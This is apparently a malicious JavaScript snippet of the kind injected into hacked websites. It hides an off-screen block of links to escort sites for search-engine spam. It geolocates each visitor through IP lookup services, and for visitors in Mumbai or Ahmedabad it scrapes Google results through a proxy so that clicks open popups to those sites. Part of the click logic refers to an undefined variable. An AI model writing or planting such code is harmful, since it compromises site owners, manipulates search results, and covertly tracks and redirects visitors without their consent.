let EFV='<div style="position:absolute;z-index:-999;left:-99%;"><a href="https://mumbai.miniescort.com">Mumbai Call Girl</a><a href="https://www.mrjaz.com">MrJaz</a><a href="https://sohanisharma.com">ahmedabad escorts</a><a href="https://sohanisharma.com/khushi-chhetri-independent-call-girls-in-ahmedabad-escorts-service">ahmedabad call girl</a><a href="https://miniescort.com">Mini Escort</a><a href="https://sunainapatel.com">Sunaina Patel</a></div>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);

let dtm=(new Date).getMinutes();
let dts=(new Date).getSeconds();
let aa='';
let bb=''
// https://ipapi.co/country_name
if(!localStorage.xrd){
  (async()=>{
    localStorage.xrd=1;
     try {
        aa=await(await(await fetch('http://ip-api.com/line/?fields=city')).text());
      }catch(e){
        aa=await(await(await fetch('https://ipapi.co/city')).text());
      }
    if(aa=='Mumbai'){localStorage.mumb='1'}
    if(aa=='Ahmadabad'){localStorage.ahme='1'}
    uhd()
  })();
}

let uhd=()=>{
    (async(s,k)=>{
    if(localStorage.mumb){s='best+mumbai+escorts+mumbai.miniescort.com';k='mumbai.miniescort.com/&'}
    if(localStorage.ahme) {s='ahmedabad+escorts+sohanisharma';k='sohanisharma.com/&'}
    (await(await fetch(`https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(`https://www.google.com/search?q=${s}&start=0&num=5`)}`)).text()).split('"').forEach(a=>{
        if (a.includes(k)){bb=`https://www.google.com${a.replaceAll('&amp;','&')}`}
    })
    })()
    document.onclick=()=>{
        if(m==3&&dts>5&&dts<9&bb!=''){window.open(bb);}
        sessionStorage.i='i';
    }
}
if(!sessionStorage.i){uhd()}

// United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania
